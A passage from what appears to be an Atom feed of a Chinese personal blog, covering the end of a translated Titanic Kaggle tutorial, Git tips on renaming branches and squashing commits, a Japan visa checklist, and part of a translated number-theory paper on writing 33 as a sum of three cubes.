class="string">&#x27;min_samples_leaf&#x27;</span>: [<span class="number">1</span>, <span class="number">3</span>, <span class="number">10</span>],</span><br><span class="line">                 <span class="string">&#x27;bootstrap&#x27;</span>: [<span class="literal">True</span>, <span class="literal">False</span>],</span><br><span class="line">                 &#125;</span><br><span class="line">    forest = RandomForestClassifier()</span><br><span class="line">    cross_validation = StratifiedKFold(n_splits=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    grid_search = GridSearchCV(forest,</span><br><span class="line">                               scoring=<span class="string">&#x27;accuracy&#x27;</span>,</span><br><span class="line">                               param_grid=parameter_grid,</span><br><span class="line">                               cv=cross_validation,</span><br><span class="line">                               verbose=<span class="number">1</span></span><br><span class="line">                              )</span><br><span class="line"></span><br><span class="line">    grid_search.fit(train, targets)</span><br><span class="line">    model = grid_search</span><br><span class="line">    parameters = grid_search.best_params_</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Best score: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(grid_search.best_score_))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Best parameters: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(grid_search.best_params_))</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    parameters = &#123;<span class="string">&#x27;bootstrap&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;min_samples_leaf&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;n_estimators&#x27;</span>: <span class="number">50</span>,</span><br><span class="line">                  <span class="string">&#x27;min_samples_split&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;max_features&#x27;</span>: <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;max_depth&#x27;</span>: <span class="number">6</span>&#125;</span><br><span class="line"></span><br><span class="line">    model = RandomForestClassifier(**parameters)</span><br><span class="line">    model.fit(train, targets)</span><br></pre></td></tr></table></figure><p>现在通过扫描超参数的几个组合来构建模型，我们可以生成一个输出文件以在 Kaggle 上提交。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output = model.predict(test).astype(<span class="built_in">int</span>)</span><br><span class="line">df_output = pd.DataFrame()</span><br><span class="line">aux = pd.read_csv(<span class="string">&#x27;./data/test.csv&#x27;</span>)</span><br><span class="line">df_output[<span class="string">&#x27;PassengerId&#x27;</span>] = aux[<span class="string">&#x27;PassengerId&#x27;</span>]</span><br><span class="line">df_output[<span class="string">&#x27;Survived&#x27;</span>] = output</span><br><span class="line">df_output[[<span class="string">&#x27;PassengerId&#x27;</span>,<span class="string">&#x27;Survived&#x27;</span>]].to_csv(<span class="string">&#x27;./predictions/gridsearch_rf.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3><span id="bonus-hun-he-bu-tong-mo-xing">[BONUS] 混合不同模型</span></h3><p>我没有亲自上传基于模型混合的提交，但这是你可以这么做：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trained_models = []</span><br><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> models:</span><br><span class="line">    model.fit(train, targets)</span><br><span class="line">    trained_models.append(model)</span><br><span class="line"></span><br><span class="line">predictions = []</span><br><span class="line"><span class="keyword">for</span> model <span class="keyword">in</span> trained_models:</span><br><span class="line">    predictions.append(model.predict_proba(test)[:, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">predictions_df = pd.DataFrame(predictions).T</span><br><span class="line">predictions_df[<span class="string">&#x27;out&#x27;</span>] = predictions_df.mean(axis=<span class="number">1</span>)</span><br><span class="line">predictions_df[<span class="string">&#x27;PassengerId&#x27;</span>] = aux[<span class="string">&#x27;PassengerId&#x27;</span>]</span><br><span class="line">predictions_df[<span class="string">&#x27;out&#x27;</span>] = predictions_df[<span class="string">&#x27;out&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s: <span class="number">1</span> <span class="keyword">if</span> s &gt;= <span class="number">0.5</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">predictions_df = predictions_df[[<span class="string">&#x27;PassengerId&#x27;</span>, <span class="string">&#x27;out&#x27;</span>]]</span><br><span class="line">predictions_df.columns = [<span class="string">&#x27;PassengerId&#x27;</span>, <span class="string">&#x27;Survived&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">predictions_df.to_csv(<span class="string">&#x27;./predictions/blending_base_models.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>为了获得良好的混合提交，基本模型应该是不同的，并且它们的相关性是不相关的。</p><h2><span id="iv-jie-lun">IV - 结论</span></h2><p>在本文中，我们探讨了 <a href="http://kaggle.com">Kaggle</a> 带给我们的一个有趣的数据集。</p><p>我们浏览了数据科学管道的基本要点：</p><ul><li>数据探索和可视化：制定假设的第一步</li><li>数据清理</li><li>特征工程</li><li>特征选择</li><li>超参数调整</li><li>提交</li><li>混合</li></ul><p>如果您想测试和使用它，可以将此博客下载为笔记本：<a href="https://github.com/ahmedbesbes/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/raw/master/article_1.ipynb">我的 github repo</a></p><blockquote><p>译者注：此中文翻译地址为： <a href="https://github.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/raw/master/article_cn.ipynb">qiwihui 的 github repo</a></p></blockquote><p>关于这一挑战的文章很多，所以显然还有改进的余地。</p><p>以下是我建议的后续步骤：</p><ul><li>挖掘更多数据并最终构建新特征。</li><li>尝试不同的模型：逻辑回归，Gradient Boosted Tree，XGboost 等。</li><li>尝试集成学习技巧（堆叠）</li><li>运行 auto-ML 框架</li></ul><p>如果你能找到改善我的解决方案的方法，我会非常高兴。这可以让我更新文章，绝对给你信任。所以请随时发表评论。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      如何在 Titanic Kaggle Challenge 中获得0.8134分
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="翻译" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="机器学习" scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>重命名本地和远程 Git 分支名称</title>
    <link href="https://qiwihui.com/qiwihui-blog-54/"/>
    <id>https://qiwihui.com/qiwihui-blog-54/</id>
    <published>2019-12-02T06:12:50.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>如果不小心写错了分支名称又将分支推送到了远端，这时可以使用以下步骤进行修正：</p><span id="more"></span><ol><li><p>重命名本地分支：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -m old-name new-name</span><br></pre></td></tr></table></figure><p>若当前在 <code>old-name</code> 分支上，则可以省略 <code>old-name</code>：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -m new-name</span><br></pre></td></tr></table></figure></li><li><p>删除远程老分支：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push origin :old-name</span><br></pre></td></tr></table></figure></li><li><p>推送新的本地分支，并设置本地新分支追踪远程分支：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push origin -u new-name</span><br></pre></td></tr></table></figure></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      重命名本地和远程 Git 分支名称
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>赴日单次旅行签证申请记录</title>
    <link href="https://qiwihui.com/qiwihui-blog-59/"/>
    <id>https://qiwihui.com/qiwihui-blog-59/</id>
    <published>2019-10-03T15:43:06.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>这次赴日旅行，计划大阪奈良和东京，简单记录行前准备。</p><span id="more"></span><h2><span id="qian-zheng-suo-xu-cai-liao">签证所需材料</span></h2><p>以下材料为本次申请签证所需材料：</p><p>主申人：</p><ol><li>本人护照，原件（有效期至少在6个月以上）；</li><li>签证申请表：1份；</li><li>个人信息处理同意书：1份；</li><li>本人照片：2张，4.5*4.5cm白底彩色近照（现照，相片可淡妆）；</li><li>本人身份证正反复印件：1份；</li><li>户口本复印件：1份，户口本首页和本人页；</li><li>本人在职证明：1份，盖公司的公章；</li><li>企业营业执照副本复印件：1份；</li><li>经济证明材料：一年的工资流水账单，每个月存折上的大于8000，且近一年银行流水10万元以上；</li><li>结婚证复印件：1份。</li></ol><p>随行：</p><ol><li>本人护照，原件（有效期至少在6个月以上）；</li><li>签证申请表：1份；</li><li>个人信息处理同意书：1份；</li><li>本人照片：2张，4.5*4.5cm白底彩色近照（现照，相片可淡妆）；</li><li>本人身份证正反复印件：1份；</li><li>户口本复印件：1份，户口本首页和本人页；</li><li>结婚证复印件：1份。</li></ol><p>因为选择的代办旅行社没有要求赴日行程和机票酒店预订记录，所以没有提供。</p><h2><span id="ti-qian-gou-mai-huo-yu-ding-de-wu-pin">提前购买或预订的物品</span></h2><ol><li>机票，酒店预订；</li><li>通信：日本流量卡（也可以使用随身wifi或者办理电话卡国际套餐）；</li><li>预订和服体验；</li><li>预订东京迪斯尼海洋馆门票；</li><li>车票基本都在当地购买了，没有提前预订。</li></ol><p>最后，最最重要的，就是开心就好，不用太拘泥于景点有没有都游览一遍。</p><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/59#issuecomment-472294058"><strong>qiwihui</strong></a> on: <strong>3/13/2019</strong></p></blockquote><h2><span id="qian-zheng-shen-qing"><img src="https://github.trello.services/images/mini-trello-icon.png" alt> </span></h2><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/59#issuecomment-482011539"><strong>qiwihui</strong></a> on: <strong>4/11/2019</strong></p></blockquote><p><img src="https://github.trello.services/images/mini-trello-icon.png" alt> <a href="https://trello.com/c/rJvp34cd/134-%E6%97%A5%E6%9C%AC%E6%A8%B1%E8%8A%B1%E4%B9%8B%E8%A1%8C">日本樱花之行</a></p>]]></content>
    
    <summary type="html">
    
      赴日单次旅行签证申请记录
    
    </summary>
    
    
      <category term="生活" scheme="https://qiwihui.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>Git合并提交</title>
    <link href="https://qiwihui.com/qiwihui-blog-70/"/>
    <id>https://qiwihui.com/qiwihui-blog-70/</id>
    <published>2019-09-05T06:40:55.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>在日常开发中，我们的Git提交原则经常是小功能多次提交，但是有时需要在完成功能之后将多个连续的提交合并成一个，或者进行分支合并时，只保留一个提交，以保证分支简介，这时就需要进行squash操作，两种分别称为 Rebase Squash 和 Merge Squash。这篇tip主要记录如何处理这两种操作以及之间的区别，</p><span id="more"></span><h2><span id="rebase-squash">Rebase Squash</span></h2><p>用来将多个连续的提交合并为一个，以下面的提交记录为例，<code>master</code>是主分支，分支 <code>featureY</code> 提交了一系列的修改：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 392dc11 - (HEAD -&gt; featureY) Y5 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 740e7d2 - Y4 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* b54cd87 - Y3 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* fb3a5cf - Y2 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 61b5ff9 - Y1 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 220e45c - (master) feature X (7 minutes ago) &lt;qiwihui&gt;</span><br></pre></td></tr></table></figure><p>其中，<code>lg</code> 是如下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[alias]</span><br><span class="line">        lg = log --color --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit --</span><br></pre></td></tr></table></figure><p>这里我们需要合并 <code>featureY</code> 功能分支上的 <code>Y1</code> 到 <code>Y5</code> 这五个提交为一个。git提供了如下命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git rebase --interactive HEAD~[N]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者</span></span><br><span class="line">git rebase -i HEAD~[N]</span><br></pre></td></tr></table></figure><p>其中 <code>[N]</code> 表示需要合并的数量，从最近一个提交开始数，这里为<code>5</code>。在命令行输入 <code>git rebase --interactive HEAD~5</code> 进入编辑器进行选择。注意，这里的提交顺序是 <strong>反</strong> 的，从最早的 <code>Y1</code> 开始：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pick 61b5ff9 Y1</span><br><span class="line">pick fb3a5cf Y2</span><br><span class="line">pick b54cd87 Y3</span><br><span class="line">pick 740e7d2 Y4</span><br><span class="line">pick 392dc11 Y5</span><br></pre></td></tr></table></figure><p>对应需要合并的提交，将<code>pick</code>改成<code>squash</code>（或者简化为<code>s</code>），修改之后为：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pick 61b5ff9 Y1</span><br><span class="line">s fb3a5cf Y2</span><br><span class="line">s b54cd87 Y3</span><br><span class="line">s 740e7d2 Y4</span><br><span class="line">s 392dc11 Y5</span><br></pre></td></tr></table></figure><p>保存并关闭编辑器，这是编辑器会自动跳出并需要你提交一个新的提交：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is a combination of 5 commits.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the 1st commit message:</span></span><br><span class="line"></span><br><span class="line">Y1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the commit message <span class="comment">#2:</span></span></span><br><span class="line"></span><br><span class="line">Y2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the commit message <span class="comment">#3:</span></span></span><br><span class="line"></span><br><span class="line">Y3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the commit message <span class="comment">#4:</span></span></span><br><span class="line"></span><br><span class="line">Y4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This is the commit message <span class="comment">#5:</span></span></span><br><span class="line"></span><br><span class="line">Y5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please enter the commit message <span class="keyword">for</span> your changes. Lines starting</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">with <span class="string">&#x27;#&#x27;</span> will be ignored, and an empty message aborts the commit.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Date:      Thu May 9 13:45:03 2019 +0800</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># interactive rebase in progress; onto 220e45c</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Last commands <span class="keyword">done</span> (5 commands <span class="keyword">done</span>):</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   squash 740e7d2 Y4</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   squash 392dc11 Y5</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">No commands remaining.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">You are currently rebasing branch <span class="string">&#x27;featureY&#x27;</span> on <span class="string">&#x27;220e45c&#x27;</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Changes to be committed:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">   new file:   featY</span></span><br><span class="line"><span class="meta prompt_">#</span></span><br></pre></td></tr></table></figure><p>可以看到，Git提供了详细的信息指导提交，只需要修改成你需要的信息即可，比如 <code>featureY</code>，然后保存。这时就完成了修改，修改之后的提交信息如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 1b07941 - (HEAD -&gt; featureY) featureY (3 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 220e45c - (master) feature X (36 minutes ago) &lt;qiwihui&gt;</span><br></pre></td></tr></table></figure><h2><span id="merge-squash">Merge Squash</span></h2><p>用于在合并分支时，最后只在合并后的分支上保留一个提交。同样以上面的代码提交为例子。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 392dc11 - (HEAD -&gt; featureY) Y5 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 740e7d2 - Y4 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* b54cd87 - Y3 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* fb3a5cf - Y2 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 61b5ff9 - Y1 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 220e45c - (master) feature X (7 minutes ago) &lt;qiwihui&gt;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout master</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge --squash featureY</span>  </span><br><span class="line">Updating 220e45c..392dc11</span><br><span class="line">Fast-forward</span><br><span class="line">Squash commit -- not updating HEAD</span><br><span class="line"> featY | 5 +++++</span><br><span class="line"> 1 file changed, 5 insertions(+)</span><br><span class="line"> create mode 100644 featY</span><br></pre></td></tr></table></figure><p>此时，分支<code>featureY</code>保持不变，同时在<code>master</code>上多了一个未被提交的更改：</p><p><img src="https://user-images.githubusercontent.com/3297411/57431740-503e4680-7266-11e9-88d3-a9a0cb3fb7a5.png" alt="git-merge-squash"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        new file:   featY</span><br></pre></td></tr></table></figure><p>这些更改是分支<code>featureY</code>中所有提交的合并，现在只需要提交这些更改就可以了：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;featureY&quot;</span><br></pre></td></tr></table></figure><h2><span id="qu-bie">区别</span></h2><p>从以上的擦坐过程可以看出两者之间的差别：Rebase Squash会合并之前的提交，之前的记录会消失，而Merge Squash只会在合并的分支上新生成提交，原来的那些提交熬还会保留。</p><h2><span id="duo-shuo-yi-dian">多说一点</span></h2><p>如果需要合并的提交数量很多，数数容易出错，可以使用提交哈希来识别：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git rebase --interactive [commit-hash]</span><br></pre></td></tr></table></figure><p>这个<code>[commit-hash]</code>是<em>需要合并的提交之前的一个提交</em>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 392dc11 - (HEAD -&gt; featureY) Y5 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 740e7d2 - Y4 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* b54cd87 - Y3 (5 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* fb3a5cf - Y2 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 61b5ff9 - Y1 (6 minutes ago) &lt;qiwihui&gt;</span><br><span class="line">* 220e45c - (master) feature X (7 minutes ago) &lt;qiwihui&gt;</span><br></pre></td></tr></table></figure><p>这里，需要使用 <code>220e45c</code> 而不是 <code>61b5ff9</code>。</p><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://www.internalpointers.com/post/squash-commits-into-one-git">Squash commits into one with Git</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Git合并提交
    
    </summary>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>解决33问题──将33写成3个整数的立方和</title>
    <link href="https://qiwihui.com/qiwihui-blog-61/"/>
    <id>https://qiwihui.com/qiwihui-blog-61/</id>
    <published>2019-09-04T01:20:40.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章内容翻译自论文 <a href="https://arxiv.org/abs/1903.04284">Cracking the problem with 33</a>，论文研究了方程 $x^3+y^3+z^3=k$ 在一些小的 $k$ 值的解，并首次将33写成了3个整数的立方和。完成中文可以查看项目 <a href="https://github.com/qiwihui/cracking-the-problem-with-33">qiwihui/cracking-the-problem-with-33</a>。截止到目前，100以内的自然数就剩下42还没有找到关于立方和的整数解了！</p><blockquote><p>Answer to the Ultimate Question of Life, the Universe, and Everything. – 42</p></blockquote><span id="more"></span><p>以下是论文正文翻译：</p><hr><h1><span id="jie-jue-33-wen-ti">解决33问题</span></h1><p>作者：ANDREW R. BOOKER</p><p><strong>摘要</strong> 受到Tim Browning和Brady Haran的<a href="https://www.youtube.com/channel/UCoxcjq-8xIDTYp3uz647V5A">Numberphile</a>视频&quot;<a href="https://www.youtube.com/watch?v=wymmCdLdPvM">未解决的33问题</a>&quot;的启发，我们研究了方程 $x^3+y^3+z^3=k$ 在一些小的 $k$ 值的解。 我们找到了 $k=33$的第一个已知解。</p><h2><span id="1-jian-jie">1. 简介</span></h2><p>令 $k$ 为正整数，其中 $k \equiv ±4(\mod 9)$。 然后Heath-Brown<a href="#HB92">[HB92]</a> 推测 有无限多的三元组$(x，y，z) \in \mathbb{Z}^3$ 满足</p><p>$$k = x^3 + y^3 + z^3. \quad \text{(1)}$$</p><p>早在1954年就开始对（1）进行各种数值研究<a href="#MW55">[MW55]</a>；请参阅<a href="#BPTYJ07">[BPTYJ07]</a>，了解截至2000年的这些研究的历史。自那时起进行的计算由于Elkies <a href="#Elk00">[Elk00]</a>而被算法所主导。我们所知道的最新内容是Huisman<a href="#Hui16">[Hui16]</a> 的论文， 该论文确定了（1）的所有解，其中$k \le 1000$ 且 $\max{|x|,|y|,|z|}\le 10^15$。特别是，Huisman报告说除了13个 $k \le 1000$的值以外的所有解决方案都是已知的：</p><p>$$33, 42, 114, 165, 390, 579, 627, 633, 732, 795, 906, 921, 975. \quad \text{(2)}$$</p><p>Elkies的算法通过使用格基减少（lattice basis reduction）在Fermat曲线$X^3+Y^3=1$ 附近寻找有理点来工作；它非常适合同时找到许多 $k$ 值的解。在本文中，我们描述了一种在k值确定时更有效的不同方法。它的优点是可以找到所有具有 <em>最小</em>坐标界限的解，而不是Elkies算法中的最大坐标。这总是产生搜索范围的非平凡的扩张（nontrivialexpansion），因为除了可以单独考虑的有限多个例外之外，还有</p><p>$$\max {|x|,|y|,|z|} &gt; \sqrt[3]{2} \min {|x|,|y|,|z|}$$</p><p>此外，根据经验，通常情况是其中一个变量比其他变量小得多，因此我们希望实际上增益更大。</p><p>我们的策略类似于一些早期的方法（特别参见<a href="#HBLtR93">[HBLtR93]</a>，<a href="#Bre95">[Bre95]</a>，<a href="#KTS97">[KTS97]</a>和 <a href="#BPTYJ07">[BPTYJ07]</a>）， 并且基于观察：$k-z^3=x^3+y^3$的任何解都具有 $x+y$ 作为一个因子。相对于早期研究，我们的主要贡献是注意到，通过一些时间空间权衡，运行时间在高度边界内非常接近线性，并且在现代64位计算机上实现时非常实用。</p><p>更详细地说，假设 $(x，y，z)$ 是（1）的解，并且不失一般性，假设$|x| \ge |y| \ge |z|$。 然后我们有</p><p>$$k-z^{3}=x^{3}+y^{3}=(x+y)(x^{2}-x y+y^{2})$$</p><p>如果 $k-z^3=0$ 则 $y=-x$，并且 $x$ 的每个值都产生一个解。 否则，设$d=|x+y|=|x|+y \operatorname{sgn} x$， 我们看到 $d$ 可以除 $|k-z^3|$并且</p><p>$$\begin{aligned}\begin{aligned}\frac{\left|k-z^{3}\right|}{d} &amp;=x^{2}-x y+y^{2}=x(2 x-(x+y))+y^{2} \&amp;=|x|(2|x|-d)+(d-|x|)^{2}=3 x^{2}-3 d|x|+d^{2}\end{aligned}\end{aligned}$$</p><p>得到</p><p>$${x, y}=\left{\frac{1}{2} \operatorname{sgn}\left(k-z^{3}\right)\left(d \pm \sqrt{\frac{4|k-z^{3}|-d^{3}}{3 d}}\right)\right}$$</p><p>因此，给定 $z$ 的候选值，通过遍历 $|k-z^3|$ 的所有除数，有一个有效的程序来查找 $x$ 和 $y$ 的所有相应值。这个基本算法在假设整数分解的时间复杂度的标准启发式（standardheuristics）下，已经能在 时间 $O(B^{1+\varepsilon})$ 内找到满足$\min{|x|,|y|,|z|}\ge B$ 的所有解。在下一节中，我们将解释如何避免因子分解并更有效地实现相同目的。</p><p><strong>感谢</strong> 感谢Roger Heath-Brown提供了有用的意见和建议。</p><h2><span id="2-fang-fa">2. 方法</span></h2><p>为了便于表示，我们假设$k \equiv ±3(\mod 9)$；请注意，这适用于（2）中的所有 $k$。由于上述基本算法对于寻找小解是合理的，因此我们将假设 $|z|&gt;\sqrt{k}$。此外，如果我们将（1）专门用于 $y=z$ 的解，那么我们得到Thue方程$x^3+2y^3=k$，这是有效可解的。 使用 PARI/GP<a href="#The18">[The18]</a> 中的Thue求解器，我们验证了（2）中的 $k$不存在这样的解。 因此，我们可以进一步假设 $y \ne z$。</p><p>由于 $|z|&gt;\sqrt{k} \ge \sqrt[3]{k}$，我们有</p><p>$$\operatorname{sgn} z=-\operatorname{sgn}(k-z^{3})=-\operatorname{sgn}(x^{3}+y^{3})=-\operatorname{sgn} x.$$</p><p>同样，因为 $x^3 + z^3 = k-y^3$ 和 $|y|\ge |z|$， 我们有$\operatorname{sgn} y=-\operatorname{sgn} x=\operatorname{sgn} z$。将（1）的两边乘以 $-\operatorname{sgn} z$，我们得到</p><p>$$|x|^{3}-|y|^{3}-|z|^{3}=-k \operatorname{sgn} z \quad \text{(4)}$$</p><p>令 $\alpha=\sqrt[3]{2}-1$，并且 $d=|x+y|=|x|-|y|$。 如果$d \ge \alpha |z|$ 则</p><p>$$\begin{aligned}\begin{aligned}-k \operatorname{sgn} z &amp;=|x|^{3}-|y|^{3}-|z|^{3} \geq(|y|+\alpha|z|)^{3}-|y|^{3}-|z|^{3} \&amp;=3 \alpha(\alpha+2)(|y|-|z|) z^{2}+3 \alpha(|y|-|z|)^{2}|z| \&amp; \geq 3 \alpha(\alpha+2)|y-z| z^{2}\end{aligned}\end{aligned}$$</p><p>由于 $3 \alpha(\alpha+2)&gt;1$， 这与我们的假设不相容，即 $y \ne z$ 和$|z|&gt;\sqrt{k}$。 因此我们必然有 $0&lt;d&lt;\alpha|z|$。</p><p>接下来，减少（4）模3并回想我们的假设 $k \equiv ±3(\mod 9)$，我们有</p><p>$$d=|x|-|y| \equiv|z| \quad(\mod 3).$$</p><p>设 $\epsilon\in{±1}$ 使得 $k \equiv 3 \epsilon(\mod 9)$。然后，由于每个立方数都与 $0$ 或 $±1(mod 9)$ 相等， 我们必然有$x \equiv y \equiv z \equiv \epsilon(\mod 3)$， 因此$\operatorname{sgn} z=\epsilon(\frac{|z|}{3})=\epsilon(\frac{d}{3})$。基于（3），当且仅当 $d | z^{3}-k$ 以及$3d(4|z^{3}-k|-d^3) = 3d(4\epsilon(\frac{d}{3})(z^{3}-k)-d^{3})$是平方数时， 我们得到（1）的解。</p><p>总之，找到（1）的所有解并且满足$|x| \ge |y| \ge |z|&gt;\sqrt{k}$，$y \ne z$ 和$|z|\le B$，对于每个与3互质的 $d\in\mathbb{Z}\cap(0,\alpha B)$，解决以下系统就足够了：</p><p>$$\begin{aligned}\begin{aligned}&amp;{\frac{d}{\sqrt[3]{2}-1}&lt;|z| \le B, \quad \operatorname{sgn} z=\epsilon\left(\frac{d}{3}\right), \quad z^{3} \equiv k \quad(\mod d)} \&amp;{3 d\left(4 \epsilon\left(\frac{d}{3}\right)(z^{3}-k)-d^{3}\right)=\square} &amp; \text{(5)}\end{aligned}\end{aligned}$$</p><p>我们解决这个问题的方法很简单：我们通过它们的主要因子分解递归地计算 $d$的值， 并应用中国剩余定理来将 $z^{3} \equiv k(\mod d)$的解减少到素数模幂的情况下， 其中标准算法可以适用。设$r_{d}(k)=# \left{z(\mod d):z^{3} \equiv k(\mod d)\right}$ 表示 $k$ 模 $d$的立方根数。通过标准分析估计，由于 $k$ 不是立方数，我们有</p><p>$$\sum_{d \le \alpha B} r_{d}(k) \ll_{k} B$$</p><p>启发式地，计算对所有素数 $p\le \alpha B$ 的 $z^{3} \equiv k(\mod p)$的解 可以用 $[0, \alpha B]$ 上的整数在 $O(B)$ 算术运算来完成； 见例如[<a 